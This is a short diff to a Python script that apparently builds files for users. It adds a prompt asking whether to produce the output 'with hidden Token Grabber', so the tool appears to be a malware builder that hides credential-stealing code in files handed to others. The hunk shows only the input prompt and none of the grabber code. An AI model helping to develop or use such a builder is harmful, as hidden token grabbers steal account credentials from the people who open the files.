@@ -19,6 +19,9 @@ print("More at: " + disc + '\n')
 print("Please insert the name of your files you will create:")
 name = input()
 
+print("Type: Y/N  (Non Token Grabber or with hidden Token Grabber)")
+non = input().lower()
+
     # Options to build
 print('''
     ########################################################################
